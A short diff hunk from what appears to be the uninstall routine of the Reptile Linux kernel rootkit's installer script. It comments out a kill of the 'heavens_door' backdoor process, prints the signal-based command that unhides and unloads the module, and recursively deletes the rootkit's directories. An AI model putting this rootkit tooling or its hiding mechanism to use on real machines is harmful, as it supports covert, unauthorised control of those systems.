@@ -80,7 +80,7 @@ function reptile_uninstall {
 	echo -e "\n\e[01;31mBe sure to unhide and unload the module or this script will not work properly!\e[00m"
 	echo -e "Command: \e[01;32mkill -50 0 && rmmod reptile_mod\e[00m\n"
     	echo -e "\e[00;31m############################# \e[01;36mUninstalling...\e[00;31m ##############################\e[00m\n"
-	kill -9 `ps -ef | grep heavens_door | grep -v grep | awk '{print $2}'`
+	#kill -9 `ps -ef | grep heavens_door | grep -v grep | awk '{print $2}'`
 	rm -rf /reptile
 	rm -rf $DRIVER_DIRECTORY
 	rm -rf /etc/rc.modules
